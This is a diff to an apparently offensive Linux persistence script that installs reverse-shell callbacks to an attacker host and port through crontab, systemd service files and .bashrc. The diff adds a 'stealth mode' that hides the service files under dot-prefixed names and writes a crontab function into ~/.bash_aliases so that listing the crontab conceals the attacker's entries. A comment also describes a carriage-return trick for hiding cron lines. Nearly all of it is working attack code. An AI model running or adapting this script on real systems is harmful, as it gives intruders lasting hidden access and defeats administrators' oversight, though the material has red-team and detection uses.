@@ -3,14 +3,16 @@
 # The basic idea is that you have commands that can execute reverse shells (methods, e.g. bash) and ways to make those shells persist on the system (doors, e.g. crontab)
 # The script will enumerate all methods available and for each, enumerate all doors
 
-DRYRUN=0 # All persistence will install if = to 0
 CRON="* * * * *"
+DISABLEBASHRC=0
+DRYRUN=0
 EZID=$(mktemp -d)
 JJSFILE=$(mktemp)
-PAYLOADFILE=$(mktemp)
 PASSWDFILE=$(mktemp)
-TEMPCRON=$(mktemp)
+PAYLOADFILE=$(mktemp)
 PERMACRON=$(mktemp)
+STEALTHMODE=0
+TMPCRON=$(mktemp)
 TMPSERVICE=$(mktemp -u | sed 's/.*\.//g').service
 TMPSERVICESHELLSCRIPT=$(mktemp -u | sed 's/.*\.//g').sh
 
@@ -19,17 +21,23 @@ HELP="
 \e[33m -h, --help\e[0m show this message\n
 \e[33m-d, --dryrun\e[0m dry run, do not install persistence, just enumerate\n
 \e[33m-i, --rhost\e[0m IP/domain to call back to\n
-\e[33m-p, --rport\e[0m port to call back to\n"
+\e[33m-p, --rport\e[0m port to call back to\n
+\e[33m-s, --stealth-mode\e[0m various trivial modifications in an attempt to hide the backdoors from humans - see documentation"
 
 while test $# -gt 0;
 do
 	case "$1" in
 		-h|--help)
-			echo $INFO; echo -e $HELP; exit ;;
+			echo $INFO
+			echo -e $HELP
+			exit 
+			shift ;;
 		-d|--dryrun)
 			shift
-			DRYRUN=1
-			shift ;;
+			DRYRUN=1 ;;
+		 -s|--stealth-mode)
+			shift
+			STEALTHMODE=1 ;;
 		-i|--rhost)
 			shift
 			if test $# -gt 0;
@@ -57,6 +65,36 @@ then
 		echo -e $HELP
 		exit
 	fi
+else
+	if $(echo $RPORT | grep -q "[0-9]" && echo $RHOST | grep -qi "[A-Za-z0-9]");
+	then
+		echo $INFO
+		echo -e $HELP
+		exit
+	fi
+fi
+
+if [ "$STEALTHMODE" -eq 1 ];
+then
+	TMPSERVICE=.$(mktemp -u | sed 's/.*\.//g').service
+	TMPSERVICESHELLSCRIPT=.$(mktemp -u | sed 's/.*\.//g').sh
+	DISABLEBASHRC=1
+	# For crontab, I can either do the carriage return trick
+	# echo -e "* * * * * echo task\rno crontab for $USER" | crontab
+	# or use the bashrc to "hijack" "crontab -l" to list everything but ours
+	# for the carriage return trick, remember you may have to count columns to properly fill space
+	echo 'function crontab () {
+	REALBIN="$(which crontab)"
+	if $(echo "$1" | grep -qi "\-l");
+	then
+		if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];then echo no crontab for $USER; else $REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"; fi;
+	elif $(echo "$1 | grep -qi "\-r);
+	then
+		if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");then `$REALBIN` -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab; else $REALBIN -r; fi;
+	else
+		$REALBIN "${@:1}"
+	fi
+}' >> ~/.bash_aliases
 fi
 
 # PHP, Perl, Node, JJS, are broken; going to fix
@@ -102,13 +140,13 @@ enum_methods() {
 }
 
 # enumerate where all backdoors can be placed
-enum_doors() {	
+enum_doors() {
 	DOORS=(
 	# array entry format = door , eval statement , hinge: <- the ":" is important, and the spaces around the commas
 	# door = command
 	# eval statement = same as above
 	# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
-	"crontab , crontab -l > $TEMPCRON; echo \"* * * * * echo linper\" >> $TEMPCRON; crontab $TEMPCRON; crontab -l > $TEMPCRON; cat $TEMPCRON | grep -v linper > $PERMACRON; crontab $PERMACRON; if grep -qi [A-Za-z0-9] $PERMACRON; then crontab $PERMACRON; else crontab -r; fi; grep linper -qi $TEMPCRON , echo \"$CRON $PAYLOAD\" >> $PERMACRON; crontab $PERMACRON; rm $PERMACRON:"
+	"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $PERMACRON; crontab $PERMACRON; if grep -qi [A-Za-z0-9] $PERMACRON; then crontab $PERMACRON; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $PERMACRON; crontab $PERMACRON; rm $PERMACRON:"
 	"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$TMPSERVICESHELLSCRIPT; if test -f /etc/systemd/system/$TMPSERVICE; then echo > /dev/null; else touch /etc/systemd/system/$TMPSERVICE; echo \"[Service]\" >> /etc/systemd/system/$TMPSERVICE; echo \"Type=oneshot\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$TMPSERVICESHELLSCRIPT \" >> /etc/systemd/system/$TMPSERVICE; echo \"[Install]\" >> /etc/systemd/system/$TMPSERVICE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$TMPSERVICE; chmod 644 /etc/systemd/system/$TMPSERVICE; systemctl start $TMPSERVICE 2> /dev/null & sleep .0001; systemctl enable $TMPSERVICE 2> /dev/null & sleep .0001; fi;:"
 	"bashrc , cd; find -writable -name .bashrc | grep -qi bashrc , echo \"$PAYLOAD 2> /dev/null & sleep .0001\" >> ~/.bashrc"
 )
@@ -127,10 +165,15 @@ enum_doors() {
 				then
 					if echo $DOOR | grep -qi "[a-z]";
 					then
-						echo "[+] Door Found: $DOOR"
-						if [ "$DRYRUN" -eq 0 ];
+						if [ $DISABLEBASHRC -eq 1 ] && $(echo $DOOR | grep -qi bashrc );
 						then
-							echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null && echo " - Persistence Installed: $METHOD using $DOOR"
+							:
+						else
+							echo "[+] Door Found: $DOOR"
+							if [ "$DRYRUN" -eq 0 ];
+							then
+								echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null && echo " - Persistence Installed: $METHOD using $DOOR"
+							fi
 						fi
 					fi
 				fi
